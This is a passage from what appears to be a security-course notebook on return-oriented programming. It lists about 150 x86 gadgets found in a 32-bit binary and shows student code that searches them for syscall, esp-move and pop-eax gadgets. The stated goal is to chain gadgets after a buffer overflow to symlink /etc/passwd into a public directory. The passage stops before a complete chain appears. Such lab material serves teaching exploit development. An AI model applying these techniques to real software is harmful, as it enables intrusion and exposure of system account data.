# 080c64f1:	pop	esi
# 080c64f2:	pop	edi
# 080c64f3:	ret
# Gadget #3002:
# 080c64ee:	clc
# 080c64ef:	add	bl, byte ptr [ebx + 0x5e]
# 080c64f2:	pop	edi
# 080c64f3:	ret
# Gadget #3003:
# 080c6558:	mov	dword ptr [ebx + 0x14], eax
# 080c655b:	add	esp, 0x28
# 080c655e:	pop	ebx
# 080c655f:	ret
# Gadget #3004:
# 080c6559:	inc	ebx
# 080c655a:	adc	al, 0x83
# 080c655c:	les	ebp, ptr [eax]
# 080c655e:	pop	ebx
# 080c655f:	ret
# Gadget #3005:
# 080c7ac5:	ljmp	0x5f5e:0x5b1cc483
# 080c7acc:	pop	ebp
# 080c7acd:	ret
# Gadget #3006:
# 080c7bec:	rol	dword ptr [ebx + 0x5e5b1cc4], cl
# 080c7bf2:	pop	edi
# 080c7bf3:	pop	ebp
# 080c7bf4:	ret
# Gadget #3007:
# 080c7d2d:	add	bh, al
# 080c7d2f:	rol	dword ptr [eax + 0x7b], 0x10
# 080c7d33:	or	bh, al
# 080c7d35:	ret
# Gadget #3008:
# 080c7d30:	inc	eax
# 080c7d31:	jnp	0x80c7d43
# 080c7d33:	or	bh, al
# 080c7d35:	ret
# Gadget #3009:
# 080c7f2a:	jg	0x80c7f2c
# 080c7f2c:	add	byte ptr [ecx], bh
# 080c7f2e:	ret
# Gadget #3010:
# 080c7f5d:	les	edi, ptr [ecx + esi - 0x40]
# 080c7f61:	pop	ebx
# 080c7f62:	pop	esi
# 080c7f63:	pop	edi
# 080c7f64:	pop	ebp
# 080c7f65:	ret
# Gadget #3011:
# 080c7f5e:	jl	0x80c7f91
# 080c7f60:	rcr	byte ptr [ebx + 0x5e], 0x5f
# 080c7f64:	pop	ebp
# 080c7f65:	ret
# Gadget #3012:
# 080c8459:	dec	dword ptr [ecx + 0x28c48303]
# 080c845f:	pop	ebx
# 080c8460:	ret
# Gadget #3013:
# 080c845a:	mov	dword ptr [ebx], eax
# 080c845c:	add	esp, 0x28
# 080c845f:	pop	ebx
# 080c8460:	ret
# Gadget #3014:
# 080c8745:	jne	0x80c874c
# 080c8747:	add	esp, 0x28
# 080c874a:	pop	ebx
# 080c874b:	ret
# Gadget #3015:
# 080c878b:	nop
# 080c878d:	nop
# 080c878f:	nop
# 080c8790:	add	eax, dword ptr [esp]
# 080c8793:	ret
# Gadget #3016:
# 080c878c:	nop
# 080c878d:	nop
# 080c878f:	nop
# 080c8790:	add	eax, dword ptr [esp]
# 080c8793:	ret
# Gadget #3017:
# 080c878e:	nop
# 080c878f:	nop
# 080c8790:	add	eax, dword ptr [esp]
# 080c8793:	ret
# Gadget #3018:
# 080c8854:	xchg	ebx, eax
# 080c8855:	sbb	eax, eax
# 080c8857:	neg	eax
# 080c8859:	pop	ebx
# 080c885a:	pop	esi
# 080c885b:	pop	edi
# 080c885c:	ret
# Gadget #3019:
# 080c889d:	mov	eax, ebp
# 080c889f:	pop	ebx
# 080c88a0:	pop	ebp
# 080c88a1:	pop	esi
# 080c88a2:	pop	edi
# 080c88a3:	ret
# Gadget #3020:
# 080c88d3:	jae	0x808b380
# 080c88d9:	ret
# Gadget #3021:
# 080c8adf:	or	al, 0xb
# 080c8ae1:	je	0x80c8b07
# 080c8ae3:	or	byte ptr [edi], cl
# 080c8ae5:	xchg	esp, eax
# 080c8ae6:	ret
# Gadget #3022:
# 080c8b8b:	add	dword ptr [eax], eax
# 080c8b8d:	add	byte ptr [ebx + 0x3924245c], cl
# 080c8b93:	ret
# Gadget #3023:
# 080c8c4d:	je	0x80c8c73
# 080c8c4f:	or	byte ptr [edi], cl
# 080c8c51:	xchg	esp, eax
# 080c8c52:	ret
# Gadget #3024:
# 080c8ea9:	mov	eax, dword ptr [ebx + 0x5e5b4cc4]
# 080c8eaf:	pop	edi
# 080c8eb0:	pop	ebp
# 080c8eb1:	ret
# Gadget #3025:
# 080c8ec5:	les	ecx, ptr [ecx + esi - 0x40]
# 080c8ec9:	pop	ebx
# 080c8eca:	pop	esi
# 080c8ecb:	pop	edi
# 080c8ecc:	pop	ebp
# 080c8ecd:	ret
# Gadget #3026:
# 080c8ec6:	dec	esp
# 080c8ec7:	xor	eax, eax
# 080c8ec9:	pop	ebx
# 080c8eca:	pop	esi
# 080c8ecb:	pop	edi
# 080c8ecc:	pop	ebp
# 080c8ecd:	ret
# Gadget #3027:
# 080c9002:	and	al, 4
# 080c9004:	fstp	st(0)
# 080c9006:	add	esp, 0x20
# 080c9009:	ret
# Gadget #3028:
# 080c9007:	les	esp, ptr [eax]
# 080c9009:	ret
# Gadget #3029:
# 080c9183:	sbb	al, 0x8b
# 080c9185:	inc	edx
# 080c9186:	push	esp
# 080c9187:	add	esp, 8
# 080c918a:	pop	ebx
# 080c918b:	ret
# Gadget #3030:
# 080c9184:	mov	eax, dword ptr [edx + 0x54]
# 080c9187:	add	esp, 8
# 080c918a:	pop	ebx
# 080c918b:	ret
# Gadget #3031:
# 080c9195:	mov	eax, dword ptr [edx + 0x5c]
# 080c9198:	add	esp, 8
# 080c919b:	pop	ebx
# 080c919c:	ret
# Gadget #3032:
# 080c9196:	inc	edx
# 080c9197:	pop	esp
# 080c9198:	add	esp, 8
# 080c919b:	pop	ebx
# 080c919c:	ret
# Gadget #3033:
# 080c91ac:	clc
# 080c91ad:	inc	dword ptr [ebx - 0x3fcef73c]
# 080c91b3:	pop	ebx
# 080c91b4:	ret
# Gadget #3034:
# 080c91c8:	mov	eax, dword ptr [edx + 0x58]
# 080c91cb:	add	esp, 8
# 080c91ce:	pop	ebx
# 080c91cf:	ret
# Gadget #3035:
# 080c91c9:	inc	edx
# 080c91ca:	pop	eax
# 080c91cb:	add	esp, 8
# 080c91ce:	pop	ebx
# 080c91cf:	ret
# Gadget #3036:
# 080c9307:	ror	byte ptr [ebp + 0x5e5bf465], cl
# 080c930d:	pop	edi
# 080c930e:	pop	ebp
# 080c930f:	ret
# Gadget #3037:
# 080c94ac:	je	0x80c94d4
# 080c94ae:	add	byte ptr [eax - 0x7cec49f1], dl
# 080c94b4:	ret
# Gadget #3038:
# 080c94ad:	add	byte ptr es:[eax - 0x7cec49f1], dl
# 080c94b4:	ret
# Gadget #3039:
# 080c969c:	add	byte ptr [eax], al
# 080c969e:	add	byte ptr [eax - 0x7cfc49f1], dl
# 080c96a4:	ret
# Gadget #3040:
# 080c9a27:	mov	byte ptr [eax + 0x2398], 4
# 080c9a2e:	ret
# Gadget #3041:
# 080c9dc7:	add	eax, 0x5b000000
# 080c9dcc:	pop	esi
# 080c9dcd:	pop	edi
# 080c9dce:	pop	ebp
# 080c9dcf:	ret
# Gadget #3042:
# 080c9de4:	add	eax, dword ptr [eax]
# 080c9de6:	add	byte ptr [eax], al
# 080c9de8:	pop	ebx
# 080c9de9:	pop	esi
# 080c9dea:	pop	edi
# 080c9deb:	pop	ebp
# 080c9dec:	ret
# Gadget #3043:
# 080ca114:	aaa
# 080ca115:	add	esp, 0x2c
# 080ca118:	pop	ebx
# 080ca119:	pop	esi
# 080ca11a:	pop	edi
# 080ca11b:	pop	ebp
# 080ca11c:	ret
# Gadget #3044:
# 080ca2b3:	add	dword ptr [ebx - 0x7cf3db84], ecx
# 080ca2b9:	ret
# Gadget #3045:
# 080ca2b5:	jl	0x80ca2db
# 080ca2b7:	or	al, 0x83
# 080ca2b9:	ret
# Gadget #3046:
# 080ca3d4:	adc	byte ptr [ebx - 0x76f3db84], cl
# 080ca3da:	ret
# Gadget #3047:
# 080ca3d6:	jl	0x80ca3fc
# 080ca3d8:	or	al, 0x89
# 080ca3da:	ret
# Gadget #3048:
# 080ca487:	or	al, 0x83
# 080ca489:	ret
# Gadget #3049:
# 080ca491:	mov	dh, 0x73
# 080ca493:	add	dword ptr [ebx - 0x7cf3db84], ecx
# 080ca499:	ret
# Gadget #3050:
# 080ca4d3:	pop	ebx
# 080ca4d4:	add	dword ptr [ecx], eax
# 080ca4d6:	ret
# Gadget #3051:
# 080ca522:	mov	bh, 0x73
# 080ca524:	add	dword ptr [ebx - 0x7cf3db84], ecx
# 080ca52a:	ret
# Gadget #3052:
# 080ca67e:	add	byte ptr [eax - 0x7cec49f1], dl
# 080ca684:	ret
# Gadget #3053:
# 080ca81e:	mov	esi, 0x81fff7f4
# 080ca823:	ret
# Gadget #3054:
# 080caa1d:	mov	esp, 0x5b000000
# 080caa22:	pop	esi
# 080caa23:	pop	edi
# 080caa24:	pop	ebp
# 080caa25:	ret
# Gadget #3055:
# 080cad16:	dec	esp
# 080cad17:	add	byte ptr [eax], al
# 080cad19:	add	byte ptr [eax], al
# 080cad1b:	pop	ebx
# 080cad1c:	pop	esi
# 080cad1d:	pop	edi
# 080cad1e:	ret
# Gadget #3056:
# 080cad47:	mov	edx, dword ptr [edx]
# 080cad49:	mov	dword ptr [ebx + 0x4c], edx
# 080cad4c:	pop	ebx
# 080cad4d:	pop	esi
# 080cad4e:	pop	edi
# 080cad4f:	ret
# Gadget #3057:
# 080cad48:	adc	cl, byte ptr [ecx + 0x5e5b4c53]
# 080cad4e:	pop	edi
# 080cad4f:	ret
# Gadget #3058:
# 080cad4a:	push	ebx
# 080cad4b:	dec	esp
# 080cad4c:	pop	ebx
# 080cad4d:	pop	esi
# 080cad4e:	pop	edi
# 080cad4f:	ret
# Gadget #3059:
# 080caf50:	idiv	edi
# 080caf52:	mov	eax, dword ptr [eax]
# 080caf54:	add	esp, 8
# 080caf57:	pop	ebx
# 080caf58:	ret
# Gadget #3060:
# 080caf51:	dec	dword ptr [ebx + 0x8c48300]
# 080caf57:	pop	ebx
# 080caf58:	ret
# Gadget #3061:
# 080caf63:	sti
# 080caf64:	mov	eax, dword ptr [esp + 4]
# 080caf68:	mov	eax, dword ptr [eax + 0x48]
# 080caf6b:	ret
# Gadget #3062:
# 080caf65:	inc	esp
# 080caf66:	and	al, 4
# 080caf68:	mov	eax, dword ptr [eax + 0x48]
# 080caf6b:	ret
# Gadget #3063:
# 080caf67:	add	al, 0x8b
# 080caf69:	inc	eax
# 080caf6a:	dec	eax
# 080caf6b:	ret
# Gadget #3064:
# 080cafb7:	and	al, 0x18
# 080cafb9:	mov	dword ptr [eax], ebx
# 080cafbb:	add	esp, 8
# 080cafbe:	pop	ebx
# 080cafbf:	ret
# Gadget #3065:
# 080cafb8:	sbb	byte ptr [ecx + 0x8c48318], cl
# 080cafbe:	pop	ebx
# 080cafbf:	ret
# Gadget #3066:
# 080cafc4:	mov	dword ptr [edx + eax*4], ecx
# 080cafc7:	add	esp, 8
# 080cafca:	pop	ebx
# 080cafcb:	ret
# Gadget #3067:
# 080cafc5:	or	al, 0x82
# 080cafc7:	add	esp, 8
# 080cafca:	pop	ebx
# 080cafcb:	ret
# Gadget #3068:
# 080cafd3:	sti
# 080cafd4:	mov	eax, dword ptr [esp + 4]
# 080cafd8:	mov	eax, dword ptr [eax + 0x4c]
# 080cafdb:	ret
# Gadget #3069:
# 080cafd5:	inc	esp
# 080cafd6:	and	al, 4
# 080cafd8:	mov	eax, dword ptr [eax + 0x4c]
# 080cafdb:	ret
# Gadget #3070:
# 080cafd7:	add	al, 0x8b
# 080cafd9:	inc	eax
# 080cafda:	dec	esp
# 080cafdb:	ret
# Gadget #3071:
# 080cafef:	shr	eax, 0x1f
# 080caff2:	mov	dword ptr [ecx], eax
# 080caff4:	mov	eax, dword ptr [edx + 0x4c]
# 080caff7:	ret
# Gadget #3072:
# 080caff0:	call	0x930e3914
# 080caff5:	inc	edx
# 080caff6:	dec	esp
# 080caff7:	ret
# Gadget #3073:
# 080caff1:	pop	ds
# 080caff2:	mov	dword ptr [ecx], eax
# 080caff4:	mov	eax, dword ptr [edx + 0x4c]
# 080caff7:	ret
# Gadget #3074:
# 080cb007:	add	al, 0x8b
# 080cb009:	push	esp
# 080cb00a:	and	al, 8
# 080cb00c:	mov	dword ptr [eax + 0x4c], edx
# 080cb00f:	ret
# Gadget #3075:
# 080cb008:	mov	edx, dword ptr [esp + 8]
# 080cb00c:	mov	dword ptr [eax + 0x4c], edx
# 080cb00f:	ret
# Gadget #3076:
# 080cb00d:	push	eax
# 080cb00e:	dec	esp
# 080cb00f:	ret
# Gadget #3077:
# 080cb013:	sti
# 080cb014:	mov	eax, dword ptr [esp + 4]
# 080cb018:	mov	eax, dword ptr [eax + 0x50]
# 080cb01b:	ret
# Gadget #3078:
# 080cb015:	inc	esp
# 080cb016:	and	al, 4
# 080cb018:	mov	eax, dword ptr [eax + 0x50]
# 080cb01b:	ret
# Gadget #3079:
# 080cb017:	add	al, 0x8b
# 080cb019:	inc	eax
# 080cb01a:	push	eax
# 080cb01b:	ret
# Gadget #3080:
# 080cb023:	sti
# 080cb024:	mov	eax, dword ptr [esp + 4]
# 080cb028:	mov	eax, dword ptr [eax + 0x5c]
# 080cb02b:	ret
# Gadget #3081:
# 080cb025:	inc	esp
# 080cb026:	and	al, 4
# 080cb028:	mov	eax, dword ptr [eax + 0x5c]
# 080cb02b:	ret
# Gadget #3082:
# 080cb027:	add	al, 0x8b
# 080cb029:	inc	eax
# 080cb02a:	pop	esp
# 080cb02b:	ret
# Gadget #3083:
# 080cb058:	inc	ebp
# 080cb059:	inc	esp
# 080cb05a:	and	al, 0x1c
# 080cb05c:	add	esp, 0x28
# 080cb05f:	pop	ebx
# 080cb060:	ret
# Gadget #3084:
# 080cb05b:	sbb	al, 0x83
# 080cb05d:	les	ebp, ptr [eax]
# 080cb05f:	pop	ebx
# 080cb060:	ret
# Gadget #3085:
# 080cb073:	sti
# 080cb074:	mov	eax, dword ptr [esp + 4]
# 080cb078:	mov	eax, dword ptr [eax + 0x58]
# 080cb07b:	ret
# Gadget #3086:
# 080cb075:	inc	esp
# 080cb076:	and	al, 4
# 080cb078:	mov	eax, dword ptr [eax + 0x58]
# 080cb07b:	ret
# Gadget #3087:
# 080cb077:	add	al, 0x8b
# 080cb079:	inc	eax
# 080cb07a:	pop	eax
# 080cb07b:	ret
# Gadget #3088:
# 080cb083:	sti
# 080cb084:	mov	eax, dword ptr [esp + 4]
# 080cb088:	mov	eax, dword ptr [eax + 0x54]
# 080cb08b:	ret
# Gadget #3089:
# 080cb085:	inc	esp
# 080cb086:	and	al, 4
# 080cb088:	mov	eax, dword ptr [eax + 0x54]
# 080cb08b:	ret
# Gadget #3090:
# 080cb087:	add	al, 0x8b
# 080cb089:	inc	eax
# 080cb08a:	push	esp
# 080cb08b:	ret
# Gadget #3091:
# 080cb156:	add	byte ptr [eax], al
# 080cb158:	mov	eax, ebx
# 080cb15a:	pop	ebx
# 080cb15b:	pop	esi
# 080cb15c:	pop	edi
# 080cb15d:	pop	ebp
# 080cb15e:	ret
# Gadget #3092:
# 080cb157:	add	byte ptr [ecx + 0x5f5e5bd8], cl
# 080cb15d:	pop	ebp
# 080cb15e:	ret
# Gadget #3093:
# 080cb16c:	ret
# 080cb16d:	lea	esi, [esi]
# 080cb170:	endbr32
# 080cb174:	ret
# Gadget #3094:
# 080cb16e:	jbe	0x80cb170
# 080cb170:	endbr32
# 080cb174:	ret
# Gadget #3095:
# 080cb21e:	hlt
# 080cb21f:	mov	esi, dword ptr [ebp - 8]
# 080cb222:	mov	edi, dword ptr [ebp - 4]
# 080cb225:	leave
# 080cb226:	ret
# Gadget #3096:
# 080cb220:	jne	0x80cb21a
# 080cb222:	mov	edi, dword ptr [ebp - 4]
# 080cb225:	leave
# 080cb226:	ret
# Gadget #3097:
# 080cb221:	clc
# 080cb222:	mov	edi, dword ptr [ebp - 4]
# 080cb225:	leave
# 080cb226:	ret
# Gadget #3098:
# 080cb223:	jge	0x80cb221
# 080cb225:	leave
# 080cb226:	ret
# Gadget #3099:
# 080cb224:	cld
# 080cb225:	leave
# 080cb226:	ret
# Gadget #3100:
# 080cb237:	add	eax, dword ptr [eax]
# 080cb239:	add	byte ptr [eax], al
# 080cb23b:	mov	edi, dword ptr [ebp - 4]
# 080cb23e:	leave
# 080cb23f:	ret
# Gadget #3101:
# 080cb330:	mov	esi, dword ptr [ebp - 8]
# 080cb333:	mov	edi, dword ptr [ebp - 4]
# 080cb336:	leave
# 080cb337:	ret
# Gadget #3102:
# 080cb475:	clc
# 080cb476:	add	esp, 0x10
# 080cb479:	mov	edi, dword ptr [ebp - 4]
# 080cb47c:	leave
# 080cb47d:	ret
# Gadget #3103:
# 080cb477:	les	edx, ptr [eax]
# 080cb479:	mov	edi, dword ptr [ebp - 4]
# 080cb47c:	leave
# 080cb47d:	ret
# Gadget #3104:
# 080cb528:	call	eax
# 080cb52a:	add	esp, 0x10
# 080cb52d:	add	esp, 0xc
# 080cb530:	ret
# Gadget #3105:
# 080cb52b:	les	edx, ptr [eax]
# 080cb52d:	add	esp, 0xc
# 080cb530:	ret
# Gadget #3106:
# 080cb5d3:	or	byte ptr [ecx], bh
# 080cb5d5:	push	ecx
# 080cb5d6:	or	byte ptr [edi + 2], dh
# 080cb5d9:	sbb	eax, eax
# 080cb5db:	ret
# Gadget #3107:
# 080cb5d4:	cmp	dword ptr [ecx + 8], edx
# 080cb5d7:	ja	0x80cb5db
# 080cb5d9:	sbb	eax, eax
# 080cb5db:	ret
# Gadget #3108:
# 080cb728:	xlatb
# 080cb729:	add	esp, 0x1c
# 080cb72c:	pop	ebx
# 080cb72d:	pop	esi
# 080cb72e:	pop	edi
# 080cb72f:	pop	ebp
# 080cb730:	ret
# Gadget #3109:
# 080cb769:	or	byte ptr [eax], al
# 080cb76b:	add	byte ptr [eax], al
# 080cb76d:	add	esp, 8
# 080cb770:	pop	ebx
# 080cb771:	ret
# Gadget #3110:
# 080cb77d:	les	ecx, ptr [eax]
# 080cb77f:	mov	eax, 4
# 080cb784:	pop	ebx
# 080cb785:	ret
# Gadget #3111:
# 080cb77e:	or	byte ptr [eax + 4], bh
# 080cb784:	pop	ebx
# 080cb785:	ret
# Gadget #3112:
# 080cb780:	add	al, 0
# 080cb782:	add	byte ptr [eax], al
# 080cb784:	pop	ebx
# 080cb785:	ret
# Gadget #3113:
# 080cb7d4:	mov	eax, dword ptr [edx + 8]
# 080cb7d7:	add	esp, 8
# 080cb7da:	pop	ebx
# 080cb7db:	ret
# Gadget #3114:
# 080cb7e3:	jne	0x80cb80b
# 080cb7e5:	add	esp, 8
# 080cb7e8:	xor	eax, eax
# 080cb7ea:	pop	ebx
# 080cb7eb:	ret
# Gadget #3115:
# 080cb7e4:	add	esp, 8
# 080cb7e8:	xor	eax, eax
# 080cb7ea:	pop	ebx
# 080cb7eb:	ret
# Gadget #3116:
# 080cb802:	add	al, 0xeb
# 080cb804:	ror	byte ptr [ebp - 0x3fceff8a], cl
# 080cb80a:	ret
# Gadget #3117:
# 080cb803:	jmp	0x80cb7d7
# 080cb805:	lea	esi, [esi]
# 080cb808:	xor	eax, eax
# 080cb80a:	ret
# Gadget #3118:
# 080cb864:	ror	byte ptr [ebp - 0x3fceff8a], cl
# 080cb86a:	ret
# Gadget #3119:
# 080cb868:	xor	eax, eax
# 080cb86a:	ret
# Gadget #3120:
# 080cba2d:	sbb	eax, eax
# 080cba2f:	add	esp, 0x10
# 080cba32:	pop	ebx
# 080cba33:	pop	esi
# 080cba34:	pop	edi
# 080cba35:	ret
# Gadget #3121:
# 080cba2e:	rol	byte ptr [ebx + 0x5e5b10c4], 0x5f
# 080cba35:	ret
# Gadget #3122:
# 080cba7b:	mov	eax, edx
# 080cba7d:	pop	ebx
# 080cba7e:	pop	esi
# 080cba7f:	pop	edi
# 080cba80:	ret
# Gadget #3123:
# 080cbb01:	add	byte ptr [ecx], dh
# 080cbb03:	rcl	byte ptr [esi - 0x7d], cl
# 080cbb06:	ret
# Gadget #3124:
# 080cbb1e:	add	esp, 0x10
# 080cbb21:	pop	ebx
# 080cbb22:	pop	esi
# 080cbb23:	mov	eax, edx
# 080cbb25:	pop	edi
# 080cbb26:	ret
# Gadget #3125:
# 080cbb1f:	les	edx, ptr [eax]
# 080cbb21:	pop	ebx
# 080cbb22:	pop	esi
# 080cbb23:	mov	eax, edx
# 080cbb25:	pop	edi
# 080cbb26:	ret
# Gadget #3126:
# 080cbb20:	adc	byte ptr [ebx + 0x5e], bl
# 080cbb23:	mov	eax, edx
# 080cbb25:	pop	edi
# 080cbb26:	ret
# Gadget #3127:
# 080cbc99:	les	edi, ptr [ecx + esi]
# 080cbc9c:	rcr	byte ptr [ebx + 0x5e], 0x5f
# 080cbca0:	pop	ebp
# 080cbca1:	ret
# Gadget #3128:
# 080cbc9a:	cmp	al, 0x31
# 080cbc9c:	rcr	byte ptr [ebx + 0x5e], 0x5f
# 080cbca0:	pop	ebp
# 080cbca1:	ret
# Gadget #3129:
# 080cc0a4:	xor	byte ptr [eax - 0x77], dl
# 080cc0a7:	fsubr	st(0)
# 080cc0a9:	ret
# Gadget #3130:
# 080cc36a:	or	al, 0x83
# 080cc36c:	les	ebp, ptr [ebx + ebx*2]
# 080cc36f:	pop	esi
# 080cc370:	pop	edi
# 080cc371:	pop	ebp
# 080cc372:	ret
# Gadget #3131:
# 080cc543:	les	ecx, ptr [ecx + ecx*4 - 0x28]
# 080cc547:	pop	ebx
# 080cc548:	pop	esi
# 080cc549:	pop	edi
# 080cc54a:	pop	ebp
# 080cc54b:	ret
# Gadget #3132:
# 080cc544:	dec	esp
# 080cc545:	mov	eax, ebx
# 080cc547:	pop	ebx
# 080cc548:	pop	esi
# 080cc549:	pop	edi
# 080cc54a:	pop	ebp
# 080cc54b:	ret
# Gadget #3133:
# 080cc706:	mov	ebx, eax
# 080cc708:	mov	eax, ebx
# 080cc70a:	pop	ebx
# 080cc70b:	pop	esi
# 080cc70c:	pop	edi
# 080cc70d:	pop	ebp
# 080cc70e:	ret
# Gadget #3134:
# 080cc707:	ret
# 080cc708:	mov	eax, ebx
# 080cc70a:	pop	ebx
# 080cc70b:	pop	esi
# 080cc70c:	pop	edi
# 080cc70d:	pop	ebp
# 080cc70e:	ret
# Gadget #3135:
# 080cc712:	call	0x91f7501a
# 080cc717:	ret
# Gadget #3136:
# 080cc825:	je	0x80cc84d
# 080cc827:	add	byte ptr [ecx - 0x7c17760e], cl
# 080cc82d:	ret
# Gadget #3137:
# 080cc826:	add	byte ptr es:[ecx - 0x7c17760e], cl
# 080cc82d:	ret
# Gadget #3138:
# 080ccbe9:	mov	ah, 0x26
# 080ccbeb:	add	byte ptr [eax], al
# 080ccbed:	add	byte ptr [eax], al
# 080ccbef:	nop
# 080ccbf0:	pop	ebx
# 080ccbf1:	ret
# Gadget #3139:
# 080ccbea:	add	byte ptr es:[eax], al
# 080ccbed:	add	byte ptr [eax], al
# 080ccbef:	nop
# 080ccbf0:	pop	ebx
# 080ccbf1:	ret
# Gadget #3140:
# 080ccc20:	jmp	0x80ccb30
# 080ccc25:	lea	esi, [esi]
# 080ccc28:	ret
# Gadget #3141:
# 080ccc4b:	sal	byte ptr [ebp + 0xa], 0x83
# 080ccc4f:	les	eax, ptr [ebx + ebx*2]
# 080ccc52:	pop	esi
# 080ccc53:	ret
# Gadget #3142:
# 080ccc4c:	jne	0x80ccc58
# 080ccc4e:	add	esp, 4
# 080ccc51:	pop	ebx
# 080ccc52:	pop	esi
# 080ccc53:	ret
# Gadget #3143:
# 080ccd33:	call	0x80ccc80
# 080ccd38:	add	esp, 0x1c
# 080ccd3b:	ret
# Gadget #3144:
# 080cceb9:	test	edx, edx
# 080ccebb:	jne	0x80ccec8
# 080ccebd:	add	esp, 8
# 080ccec0:	pop	ebx
# 080ccec1:	ret
# Gadget #3145:
# 080cceba:	sal	byte ptr [ebp + 0xb], cl
# 080ccebd:	add	esp, 8
# 080ccec0:	pop	ebx
# 080ccec1:	ret
# Gadget #3146:
# 080cd16c:	idiv	edi
# 080cd16e:	add	esp, 8
# 080cd171:	xor	eax, eax
# 080cd173:	pop	ebx
# 080cd174:	ret
# Gadget #3147:
# 080cd16d:	inc	dword ptr [ebx - 0x3fcef73c]
# 080cd173:	pop	ebx
# 080cd174:	ret
# Gadget #3148:
# 080cd3fa:	jg	0x80cd3cf
# 080cd3fc:	loopne	0x80cd381
# 080cd3fe:	rol	dword ptr [edi], 9
# 080cd401:	ret
# Gadget #3149:
# 080cd597:	add	byte ptr [ecx + 0x314c245c], cl
# 080cd59d:	fcmovnb	st(0), st(7)
# 080cd59f:	ret
# Gadget #3150:
# 080cd6a5:	in	al, dx
# 080cd6a6:	or	al, 0x89
# 080cd6a8:	ret

# %%
print("Total number of gadgets: %d" % len(gadgets))
# Out:
# Total number of gadgets: 3150

# %% [markdown]
# ## Step 4: Return-Oriented Programming

# %% [markdown]
# In this step, you will use all the gadgets you found to construct a return-oriended programming attack. The goal is to create a symbolic link in the `public/` directory to `/etc/passwd` so that you can later open the link to expose the local accounts. To achieve this, you need the gadgets to perform 4 specific tasks:

# %% [markdown]
# 1. Construct the string of `/etc/passwd` on the stack
# 2. Concat an existing string to `/public`
# 3. Setting the registers of EAX, EBX, and ECX for the `symlink` system call
# 4. Make the system call

# %% [markdown]
# ur first step is to find a **system call** gadget. Typically, system calls are made through either `syscall`, `sysenter`, or `int $80`, depending on the architecture it is running. However, The GNU system C library (glibc) nowadays have a more portable design, using a kernel-injected function called `__kernel_vsyscall`. The address of this function is pre-injected into the thread control block (TCB) of the current process and is retrieved using a specific offset to the GS register. To make such a call, the following assembly code is used:
#
# ```
# call	dword ptr gs:[0x10]
# ```
#
# Please change the following cell to find gadgets that can perform system calls. If you cannot find one, you may go back to the previous cell that locates all the gadgets and extend the search range.

# %%
n = 1
for gadget in gadgets:
  # TODO: determine if this gadget contains a call to `__kernel_vsyscall`
  is_syscall_gadget = False
  is_syscall_gadget_2 = False
  for insn in gadget:
    if insn.mnemonic == 'call' and insn.op_str == 'dword ptr gs:[0x10]':
      is_syscall_gadget = True
    if insn.op_str == '__kernel_vsyscall':
      is_syscall_gadget_2 = True

  if is_syscall_gadget or is_syscall_gadget_2:
    print("Syscall Gadget #%d:" % n)
    n += 1
    for insn in gadget:
      print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
# Out:
# Syscall Gadget #1:
# 080ade79:	call	dword ptr gs:[0x10]
# 080ade80:	ret
# Syscall Gadget #2:
# 080aef20:	call	dword ptr gs:[0x10]
# 080aef27:	pop	ebx
# 080aef28:	ret

# %% [markdown]
# Next, we need to find a gadget that retrieve a pointer to the string `/etc/passwd`. We can inject the string using buffer overflow, and then retrieve the string using certain offset from esp. To do so, we need a gadget that retrieve the current value of esp (`mov xxx, esp`---`xxx` can be any register). Change the following cell to find gadgets that do this.

# %%
n = 1
for gadget in gadgets:
  # TODO: determine if this gadget contains MOV from ESP register
  is_mov_esp_gadget = False

  for insn in gadget:
    if insn.mnemonic == 'mov' and ', esp' in insn.op_str:
      is_mov_esp_gadget = True


  if is_mov_esp_gadget:
    print("MOV ESP Gadget #%d:" % n)
    n += 1
    for insn in gadget:
      print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
# Out:
# MOV ESP Gadget #1:
# 0807cff3:	mov	ebx, esp
# 0807cff5:	add	byte ptr [eax], al
# 0807cff7:	ret

# %% [markdown]
# Finding Pop EAX gadget

# %%
n = 1
for gadget in gadgets:
  # TODO: determine if this gadget contains MOV from ESP register
  is_pop_eax_gadget = False

  for insn in gadget:
    if insn.mnemonic == 'pop' and 'eax' in insn.op_str:
      is_pop_eax_gadget = True


  if is_pop_eax_gadget:
    print("POP EAX Gadget #%d:" % n)
    n += 1
    for insn in gadget:
      print("%08x:\t%s\t%s" % (insn.address, insn.mnemonic, insn.op_str))
# Out:
# POP EAX Gadget #1:
# 08059d84:	dec	eax
# 08059d85:	pop	eax
# 08059d86:	mov	dword ptr [ecx + 0x88], edx
# 08059d8c:	ret
# POP EAX Gadget #2:
# 08060953:	pop	esp
# 08060954:	add	byte ptr [eax], al
# 08060956:	add	byte ptr [eax], al
# 08060958:	pop	eax
# 08060959:	pop	edx
# 0806095a:	pop	ebx
# 0806095b:	ret
# POP EAX Gadget #3:
# 08060984:	add	byte ptr [eax], al
# 08060986:	add	byte ptr [eax], al
# 08060988:	pop	eax
# 08060989:	pop	edx
# 0806098a:	pop	ebx
# 0806098b:	ret
# POP EAX Gadget #4:
# 08062982:	jl	0x80629a8
# 08062984:	adc	byte ptr [ecx], al
# 08062986:	pop	eax
# 08062987:	add	al, 0x89
# 08062989:	ret
# POP EAX Gadget #5:
# 08062a33:	pop	eax
# 08062a34:	cmp	byte ptr [ebx + 0x5e], bl
# 08062a37:	ret
# POP EAX Gadget #6:
# 080a5945:	pop	eax
# 080a5946:	or	byte ptr [ecx + 0x10892048], cl
# 080a594c:	pop	ebx
# 080a594d:	ret
# POP EAX Gadget #7:
# 080c04a6:	shl	eax, cl
# 080c04a8:	mov	dword ptr [edi], eax
# 080c04aa:	pop	eax
# 080c04ab:	pop	ebx
# 080c04ac:	pop	esi
# 080c04ad:	pop	edi
# 080c04ae:	ret
# POP EAX Gadget #8:
# 080c04a7:	loopne	0x80c0432
# 080c04a9:	pop	es
# 080c04aa:	pop	eax
# 080c04ab:	pop	ebx
# 080c04ac:	pop	esi
# 080c04ad:	pop	edi
# 080c04ae:	ret
# POP EAX Gadget #9:
# 080c050e:	shr	eax, cl
# 080c0510:	mov	dword ptr [edi], eax
# 080c0512:	pop	eax
# 080c0513:	pop	ebx
# 080c0514:	pop	esi
# 080c0515:	pop	edi
# 080c0516:	ret
# POP EAX Gadget #10:
# 080c0511:	pop	es
# 080c0512:	pop	eax
# 080c0513:	pop	ebx
# 080c0514:	pop	esi
# 080c0515:	pop	edi
# 080c0516:	ret
# POP EAX Gadget #11:
# 080c91c9:	inc	edx
# 080c91ca:	pop	eax
# 080c91cb:	add	esp, 8
# 080c91ce:	pop	ebx
# 080c91cf:	ret
